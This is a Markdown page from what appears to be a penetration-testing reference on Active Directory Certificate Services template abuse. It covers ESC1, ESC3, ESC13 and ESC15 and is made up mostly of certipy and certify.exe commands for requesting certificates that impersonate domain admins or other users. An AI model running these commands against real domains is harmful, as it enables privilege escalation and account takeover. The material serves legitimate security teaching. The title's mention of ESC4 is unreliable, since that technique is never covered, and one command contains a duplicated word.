# Misconfigured Templates (esc1, esc4)

The template misconfigurations are the core of ADCS abuse. ESC1 lets a low-privileged user request a certificate specifying an arbitrary subject — including a domain admin — which then authenticates as that user. ESC2, ESC3 and ESC4 are variations on the same theme.

## Why It Works

A certificate template that permits enrollee-supplied subjects, grants an authentication EKU, and allows low-privileged enrollment is a direct path to impersonation. The CA signs whatever the template permits.

## Prerequisites

* Any valid domain credential with enrollment rights on the template
* A vulnerable template (identified during enumeration)

## Execution

**Misconfigured Certificate Template**

* ESC1
  * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -upn <target_user>@<domain>` [\[tool\]](https://github.com/ly4k/Certipy)
    * **→ Pass the certificate**
  * `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>" [/altname:"Admin"]` [\[tool\]](https://github.com/GhostPack/Certify)
* ESC2
  * **→ ESC3**
* ESC3
  * `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"` [\[tool\]](https://github.com/GhostPack/Certify)
    * `certify.exe request request /ca:<server>\<ca-name> /template:<template> /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]` [\[tool\]](https://github.com/GhostPack/Certify)
  * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>` [\[tool\]](https://github.com/ly4k/Certipy)
    * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>` [\[tool\]](https://github.com/ly4k/Certipy)
* ESC13
  * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>` [\[tool\]](https://github.com/ly4k/Certipy)
    * **→ Pass The Certificate (PKINIT)**
  * `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"` [\[tool\]](https://github.com/GhostPack/Certify)
* ESC15
  * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]` [\[tool\]](https://github.com/ly4k/Certipy)
    * **→ Pass the certificate (only Schannel)**
  * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]` [\[tool\]](https://github.com/ly4k/Certipy)
    * `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>` [\[tool\]](https://github.com/ly4k/Certipy)
      * **→ Pass the certificate**

## Related

* [ADCS Enumeration](file:///9685693/adcs/adcs-enumeration.md) — how to find the vulnerable template
* [Certificate Mapping Abuse (ESC9–ESC10)](file:///9685693/adcs/certificate-mapping-abuse-esc9-esc10.md) — abusing how certificates map to accounts
